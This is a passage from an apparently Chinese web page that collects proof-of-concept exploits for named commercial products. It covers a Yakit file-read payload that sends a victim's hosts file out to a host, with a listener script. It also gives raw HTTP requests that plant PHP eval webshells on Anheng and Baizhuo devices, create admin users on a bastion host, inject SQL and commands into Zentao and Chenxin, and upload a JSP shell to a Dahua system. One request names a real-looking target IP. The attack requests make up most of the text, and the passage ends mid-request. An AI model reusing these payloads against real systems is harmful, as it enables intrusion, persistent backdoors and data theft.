class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br><span class="line-number">248</span><br><span class="line-number">249</span><br><span class="line-number">250</span><br><span class="line-number">251</span><br><span class="line-number">252</span><br><span class="line-number">253</span><br><span class="line-number">254</span><br><span class="line-number">255</span><br><span class="line-number">256</span><br><span class="line-number">257</span><br><span class="line-number">258</span><br><span class="line-number">259</span><br><span class="line-number">260</span><br><span class="line-number">261</span><br><span class="line-number">262</span><br><span class="line-number">263</span><br><span class="line-number">264</span><br><span class="line-number">265</span><br><span class="line-number">266</span><br><span class="line-number">267</span><br><span class="line-number">268</span><br><span class="line-number">269</span><br><span class="line-number">270</span><br><span class="line-number">271</span><br><span class="line-number">272</span><br><span class="line-number">273</span><br><span class="line-number">274</span><br><span class="line-number">275</span><br><span class="line-number">276</span><br><span class="line-number">277</span><br><span class="line-number">278</span><br><span class="line-number">279</span><br><span class="line-number">280</span><br><span class="line-number">281</span><br><span class="line-number">282</span><br><span class="line-number">283</span><br><span class="line-number">284</span><br><span class="line-number">285</span><br><span class="line-number">286</span><br><span class="line-number">287</span><br><span class="line-number">288</span><br><span class="line-number">289</span><br><span class="line-number">290</span><br><span class="line-number">291</span><br><span class="line-number">292</span><br><span class="line-number">293</span><br><span class="line-number">294</span><br><span class="line-number">295</span><br><span class="line-number">296</span><br><span class="line-number">297</span><br><span class="line-number">298</span><br><span class="line-number">299</span><br><span class="line-number">300</span><br><span class="line-number">301</span><br><span class="line-number">302</span><br><span class="line-number">303</span><br><span class="line-number">304</span><br><span class="line-number">305</span><br><span class="line-number">306</span><br><span class="line-number">307</span><br><span class="line-number">308</span><br><span class="line-number">309</span><br><span class="line-number">310</span><br><span class="line-number">311</span><br><span class="line-number">312</span><br><span class="line-number">313</span><br><span class="line-number">314</span><br><span class="line-number">315</span><br><span class="line-number">316</span><br><span class="line-number">317</span><br><span class="line-number">318</span><br><span class="line-number">319</span><br><span class="line-number">320</span><br><span class="line-number">321</span><br><span class="line-number">322</span><br><span class="line-number">323</span><br><span class="line-number">324</span><br><span class="line-number">325</span><br><span class="line-number">326</span><br><span class="line-number">327</span><br><span class="line-number">328</span><br><span class="line-number">329</span><br><span class="line-number">330</span><br><span class="line-number">331</span><br><span class="line-number">332</span><br><span class="line-number">333</span><br><span class="line-number">334</span><br><span class="line-number">335</span><br><span class="line-number">336</span><br><span class="line-number">337</span><br><span class="line-number">338</span><br><span class="line-number">339</span><br><span class="line-number">340</span><br><span class="line-number">341</span><br><span class="line-number">342</span><br><span class="line-number">343</span><br><span class="line-number">344</span><br><span class="line-number">345</span><br><span class="line-number">346</span><br><span class="line-number">347</span><br><span class="line-number">348</span><br><span class="line-number">349</span><br><span class="line-number">350</span><br><span class="line-number">351</span><br><span class="line-number">352</span><br><span class="line-number">353</span><br><span class="line-number">354</span><br><span class="line-number">355</span><br><span class="line-number">356</span><br><span class="line-number">357</span><br><span class="line-number">358</span><br><span class="line-number">359</span><br><span class="line-number">360</span><br><span class="line-number">361</span><br><span class="line-number">362</span><br><span class="line-number">363</span><br><span class="line-number">364</span><br><span class="line-number">365</span><br><span class="line-number">366</span><br><span class="line-number">367</span><br><span class="line-number">368</span><br><span class="line-number">369</span><br><span class="line-number">370</span><br><span class="line-number">371</span><br><span class="line-number">372</span><br><span class="line-number">373</span><br><span class="line-number">374</span><br><span class="line-number">375</span><br><span class="line-number">376</span><br><span class="line-number">377</span><br><span class="line-number">378</span><br><span class="line-number">379</span><br><span class="line-number">380</span><br><span class="line-number">381</span><br></div></div><p>需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p> <p>127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn</p> <p>漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn.</p> <h2 id="_24-yakit任意文件读取"><a href="#_24-yakit任意文件读取" class="header-anchor">#</a> 24.yakit任意文件读取</h2> <p>详情可参考原文 有截图复现
原文链接：https://mp.weixin.qq.com/s/IQekVs-UU2Slh6V_frpaug</p> <p>前言：
yakit是近年新兴的一个BurpSuite平替工具，和burp的区别就在于数据包放过去不用配置ip端口协议这些，但是yakit跑起来感觉卡卡的，远不如burp那么流畅，近期yakit爆出了一个任意文件读取漏洞，此漏洞通过在网页嵌入js代码实现读取yakit使用者设备上的文件
触发版本：
引擎版本&lt; Yaklang 1.2.4-sp2
漏洞条件：
使用yakit的MITM代理并且启用任意插件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Pyload:
&lt;script&gt;
  const xhr = new XMLHttpRequest();
  xhr.open(&quot;POST&quot;, &quot;http://yakit.com/filesubmit&quot;);
  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
  xhr.send(`file={{base64enc(file(C:\\Windows\\System32\\drivers\\etc\\hosts))}}`);
&lt;/script&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>监听脚本
#! /bin/python3
import socket

# 监听地址和端口

host = '0.0.0.0'
port = 23800

# 创建socket服务器

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 绑定并监听端口

server.bind((host, port))
server.listen()

# 接收连接并监听请求

print(&quot;Listening...&quot;)
while True:
    # 接收客户端连接请求
    client, address = server.accept()
    print(f&quot;Connected by {address}&quot;)

    # 读取客户端请求数据
    request = ''
    while True:
        input_data = client.recv(1024).decode('utf-8')
        request += input_data
        if len(input_data) &lt; 1024:
            break
    
    # 提取请求头部
    headers = request.split('\n')
    print(&quot;Received headers:&quot;)
    for header in headers:
        print(header)
    
    # 关闭客户端连接
    client.close()


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><p>复现开始：
创建一个html页面并插入payload</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>启用MITM代理，不启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wMXX7dh9j86aZ7JA0WMoxwHSDdAwnMVSZLoF09zuiamTpkibBtLto8y8KA/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1
启用MITM代理并启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wM1RvwO5nnYhpX3aKZeCDdziaCEcOSDfbIcu2wNe27x7aTsPgBXo8KTsQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>原理：yakit默认不会对经过MITM代理的流量中的fuzztag进行解析，但是经过插件时会被解析，所以这也是利用限制。</p> <h2 id="_25-安恒明御安全网关rce"><a href="#_25-安恒明御安全网关rce" class="header-anchor">#</a> 25.安恒明御安全网关rce</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /webui/?g=aaa_portal_auth_local_submit&amp;bkg_flag=0&amp;$type=1&amp;suffix=1|echo+&quot;&lt;%3fphp+eval(\$_POST[\&quot;a\&quot;]);?&gt;&quot;+&gt;+.xxx.php HTTP/1.1
Host: xxx
Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10 16 0) Applewebkit/537.36 (KHTML likeGecko) Chrome/78.0.3994.108 Safari/537.36
Sec-Fetch-User: ?1
Accept:
text/html,application/xhtml+xml,application/xml;g=0.9,image/webp,image/apng,*/*;g=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip， deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>木马地址: http://xxx/webui/.xxx.php</p> <h2 id="_26-安恒明御运维审计与风险控制系统堡垒机任意用户注册"><a href="#_26-安恒明御运维审计与风险控制系统堡垒机任意用户注册" class="header-anchor">#</a> 26.安恒明御运维审计与风险控制系统堡垒机任意用户注册</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: xxx
Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
Cache-Control: max-age=0
Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1121

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;web.user_add&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;
&lt;array&gt;
&lt;data&gt;
&lt;value&gt;
&lt;string&gt;admin&lt;/string&gt;
&lt;/value&gt;
&lt;value&gt;
&lt;string&gt;5&lt;/string&gt;
&lt;/value&gt;
&lt;value&gt;
&lt;string&gt;XX.XX.XX.XX&lt;/string&gt;
&lt;/value&gt;
&lt;/data&gt;
&lt;/array&gt;
&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;
&lt;struct&gt;
&lt;member&gt;
&lt;name&gt;uname&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;deptadmin&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;name&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;deptadmin&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;pwd&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;Deptadmin@123&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;authmode&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;1&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;deptid&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;email&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;mobile&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;comment&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;roleid&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;101&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br></div></div><h2 id="_27-百卓-smart-s85f-后台文件上传漏洞"><a href="#_27-百卓-smart-s85f-后台文件上传漏洞" class="header-anchor">#</a> 27.百卓 Smart S85F 后台文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /useratte/web.php? HTTP/1.1
Host: xx.xx.xx.xx:8443
Cookie: PHPSESSID=xxxxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 598
Upgrade-Insecure-Requests: 1
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;2.php&quot;
Content-Type: application/octet-stream

&lt;?=phpinfo();
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name=&quot;id_type&quot;

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name=&quot;1_ck&quot;

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name=&quot;mode&quot;

import
-----------------------------42328904123665875270630079328—

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h2 id="_28-百卓smart-s45f命令执行"><a href="#_28-百卓smart-s45f命令执行" class="header-anchor">#</a> 28.百卓Smart S45F命令执行</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>构造URL ：/importhtml.php?type=exporthtmlmail&amp;amp;tab=tb_RCtrlLog&amp;amp;sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn

构造poc：
POST /app/sys1.php HTTP/1.1
Host: 60.22.74.195:8443
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 
1Sec-Fetch-Dest: 
documentSec-Fetch-Mode: 
navigateSec-Fetch-Site: 
noneSec-Fetch-User: ?1Te: trailers
Connection: close
Content-Type: application/x-www-form-url
encodedContent-Length: 6
 
 
 
cmd=id
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h2 id="_29-禅道-16-5-router-class-php-sql注入漏洞"><a href="#_29-禅道-16-5-router-class-php-sql注入漏洞" class="header-anchor">#</a> 29.禅道 16.5 router.class.php SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /user-login.html 
  
   account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_30-禅道18-0-18-3-backstage命令注入"><a href="#_30-禅道18-0-18-3-backstage命令注入" class="header-anchor">#</a> 30.禅道18.0~18.3 backstage命令注入</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>posT /zentaopms/www/index.php?m=zahost&amp;f=create HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win4; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json，text/javascript，*/*; g=0.01
Accept-Language: zh-CN,zh;g=0.8,zh-Tw;g=0.7,zh-HK;g=0.5,en-US;g=0.3,en;g=0.2
Accept-Encoding: gzip， deflate
Referer: http://127.0.0.1/zentaopms/www/index.php?m=zahost&amp;f=create
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-with: XMLHttpRequest
Content-Length: 134
Origin: http://127.0.0.1
Connection: close
Cookie: zentaosid=dhjpu2i3g5116j5eba85agl27f; lang=zh-cn; device=desktop; theme=default;tab=qa; windowwidth=1632; windowHeight=783
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

vsoft=kvm&amp;hostType=physical&amp;name=penson&amp;extranet=127.0.0,1%7Ccalc.exe&amp;cpuCores=2&amp;memory=16&amp;diskSize=16&amp;desc=&amp;uid=640be59da4851&amp;type=za
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="_31-辰信景云终端安全管理系统-login-sql注入漏洞"><a href="#_31-辰信景云终端安全管理系统-login-sql注入漏洞" class="header-anchor">#</a> 31.辰信景云终端安全管理系统 login SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /api/user/login

captcha=&amp;password=21232f297a57a5a743894a0e4a801fc3&amp;username=admin'and(select*from(select+sleep(3))a)='
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_32-大华车载系统任意文件上传漏洞poc"><a href="#_32-大华车载系统任意文件上传漏洞poc" class="header-anchor">#</a> 32.大华车载系统任意文件上传漏洞POC</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1 
Host: ip:port
Accept: */*
Accept-Encoding: gzip， deflate， br
Content-Length: 872
Content-Type: multipart/form-data; boundary=----63766573e5aegeegaa8cesaea4 
User-Agent: Mozilla/5.0 (Windows NT 6.2: Win64: X64) Applewebkit/537.36 (KHTML, like Gecko) QtwebEngine/5.9.1 Chrome/56.0.2924.122 Safari/537.36

------63766573e5aegeegaa8cesaea4
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.jsp&quot; 
Content-ype: image/png

GIF89a
&lt;%isp 马%&gt; 
------63766573e5ae9ee9aa8ce5aea4
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>获取路径:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220
